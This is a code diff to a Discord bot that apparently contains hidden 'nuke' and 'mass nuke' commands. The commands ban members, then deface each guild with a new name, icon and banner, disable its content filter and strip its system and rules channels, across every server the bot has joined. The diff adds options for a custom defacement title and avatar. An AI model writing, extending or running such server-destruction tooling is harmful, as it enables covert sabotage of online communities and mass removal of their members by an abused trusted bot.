@@ -372,10 +372,12 @@ class Cmds(commands.Cog):
 
         guild_id = kwargs.get('guild_id', None)
         excluded_member_id = kwargs.get('excluded_member_id', None)
+        new_guild_title = kwargs.get('new_guild_title', None)
+        avatar_path = kwargs.get('avatar_path', None)
 
         guild = self.bot.get_guild(guild_id)  
         excluded_member = guild.get_member(excluded_member_id)      
-        await self.__nuke(guild, excluded_member)
+        await self.__nuke(guild, excluded_member, new_guild_title, avatar_path)
 
         self.bot.qthread.signal_append_hterminal.emit('Finished Nuking Server')
         self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NUKE.value)
@@ -390,11 +392,13 @@ class Cmds(commands.Cog):
         time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
         self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MASS_NUKE.value)
         excluded_member_id = kwargs.get('excluded_member_id', None)
+        new_guild_title = kwargs.get('new_guild_title', None)
+        avatar_path = kwargs.get('avatar_path', None)
 
         excluded_member = discord.utils.get(self.bot.get_all_members(), id=excluded_member_id)
         old_guilds = self.bot.guilds
         results = await asyncio.gather(
-            *[self.__nuke(guild, excluded_member) for guild in self.bot.guilds], 
+            *[self.__nuke(guild, excluded_member, new_guild_title, avatar_path) for guild in self.bot.guilds], 
             return_exceptions=True)
         
         for result, guild in zip(results, old_guilds):
@@ -453,7 +457,7 @@ class Cmds(commands.Cog):
         self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MASS_LEAVE.value)
         return
     
-    async def __nuke(self, guild: discord.Guild, excluded_member: discord.Member):
+    async def __nuke(self, guild: discord.Guild, excluded_member: discord.Member, new_guild_title: str, avatar_path: str):
         self.bot.qthread.signal_append_hterminal.emit(f'Nuking Server {guild.name}')
 
         self.bot.qthread.signal_append_hterminal.emit(f'Banning Members')
@@ -531,8 +535,34 @@ class Cmds(commands.Cog):
         
         self.bot.qthread.signal_append_hterminal.emit(f'Editing Guild')
 
-        with open(os.path.join('_internal', 'shared', 'nuked.jpg'), 'rb') as nuke_icon:
-            icon = nuke_icon.read()
+        # import pdb; pdb.set_trace()
+
+        if not new_guild_title or len(new_guild_title) < 2 or len(new_guild_title) > 100:
+            new_guild_title = 'Nuked by the-cult-of-integral'
+        
+
+        if not avatar_path:
+            try:
+                with open(os.path.join('_internal', 'shared', 'nuked.jpg'), 'rb') as nuke_icon:
+                    icon = nuke_icon.read()
+            except OSError as e:
+                lu.swarning(f'Failed to read default nuke avatar file: {e}')
+                self.bot.qthread.signal_append_hterminal.emit(f'Failed to read default nuke avatar file.')
+                icon = None
+        else:
+            try:
+                with open(avatar_path, 'rb') as nuke_icon:
+                    icon = nuke_icon.read()
+            except OSError as e:
+                lu.swarning(f'Failed to read avatar file: {e}')
+                self.bot.qthread.signal_append_hterminal.emit(f'Failed to read avatar file for nuke.')
+                try:
+                    with open(os.path.join('_internal', 'shared', 'nuked.jpg'), 'rb') as nuke_icon:
+                        icon = nuke_icon.read()
+                except OSError as e:
+                    lu.swarning(f'Failed to read default nuke avatar file: {e}')
+                    self.bot.qthread.signal_append_hterminal.emit(f'Failed to read default nuke avatar file.')
+                    icon = None
         
         try:
             flags = discord.SystemChannelFlags()
@@ -542,27 +572,48 @@ class Cmds(commands.Cog):
             flags.premium_subscriptions = False
             flags.role_subscription_purchase_notification_replies = False
             flags.role_subscription_purchase_notifications = False
-            await guild.edit(
-                name='Nuked by the-cult-of-integral',
-                description='Nuked by the-cult-of-integral',
-                icon=icon,
-                banner=icon,
-                splash=icon,
-                discovery_splash=icon,
-                discoverable=False,
-                community=False,
-                default_notifications=discord.NotificationLevel.all_messages,
-                verification_level=discord.VerificationLevel.highest,
-                explicit_content_filter=discord.ContentFilter.disabled,
-                premium_progress_bar_enabled=False,
-                preferred_locale=discord.Locale.japanese,
-                afk_channel=None,
-                afk_timeout=None,
-                system_channel=None,
-                system_channel_flags=flags,
-                rules_channel=None,
-                public_updates_channel=None
-            )
+            
+            if icon is None:
+                await guild.edit(
+                    name=new_guild_title,
+                    description=new_guild_title,
+                    discoverable=False,
+                    community=False,
+                    default_notifications=discord.NotificationLevel.all_messages,
+                    verification_level=discord.VerificationLevel.highest,
+                    explicit_content_filter=discord.ContentFilter.disabled,
+                    premium_progress_bar_enabled=False,
+                    preferred_locale=discord.Locale.japanese,
+                    afk_channel=None,
+                    afk_timeout=None,
+                    system_channel=None,
+                    system_channel_flags=flags,
+                    rules_channel=None,
+                    public_updates_channel=None
+                )
+            else:
+                await guild.edit(
+                    name=new_guild_title,
+                    description=new_guild_title,
+                    icon=icon,
+                    banner=icon,
+                    splash=icon,
+                    discovery_splash=icon,
+                    discoverable=False,
+                    community=False,
+                    default_notifications=discord.NotificationLevel.all_messages,
+                    verification_level=discord.VerificationLevel.highest,
+                    explicit_content_filter=discord.ContentFilter.disabled,
+                    premium_progress_bar_enabled=False,
+                    preferred_locale=discord.Locale.japanese,
+                    afk_channel=None,
+                    afk_timeout=None,
+                    system_channel=None,
+                    system_channel_flags=flags,
+                    rules_channel=None,
+                    public_updates_channel=None
+                )
+
         except discord.HTTPException as e:
             lu.swarning(f'Failed to edit guild {guild.name}: HTTPException: {e}')
             self.bot.qthread.signal_append_hterminal.emit(f'Failed to edit guild {guild.name}')
